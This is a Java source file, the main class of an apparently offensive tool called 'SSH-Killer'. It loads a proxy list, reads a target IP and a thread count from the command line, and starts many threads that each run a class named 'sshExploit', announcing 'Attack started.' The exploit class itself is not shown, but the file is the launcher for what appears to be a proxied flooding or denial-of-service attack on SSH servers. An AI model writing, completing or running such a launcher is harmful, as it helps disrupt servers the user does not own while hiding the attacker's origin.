package xyz.dxb1l.sshkiller;

        import xyz.dxb1l.sshkiller.proxy.ProxyManager;
        import xyz.dxb1l.sshkiller.exploit.sshExploit;
        import java.util.Random;

public class SSHKiller {
    public static int threads = 0;
    public static String ip = "127.0.0.1";






    public static void main(String[] args) throws Exception {
            if(args.length != 2){
                System.out.println("[SSH-Killer] Correct usage : java -jar ssh-killer.jar 127.0.0.1 threads");
            }else {
                ProxyManager.loadProxy();
                ip = args[0];
                threads = Integer.valueOf(args[1]);
                run();

            }
            }


    public static void run() {
        Runnable run = new sshExploit();

        try {
            Thread.sleep(1000L);
        } catch (InterruptedException var3) {
            var3.printStackTrace();
        }

        System.out.println("[SSH-Killer] Attack started.");

        for(int i = 0; i < threads; ++i) {
            (new Thread(run)).start();
        }

    }




}

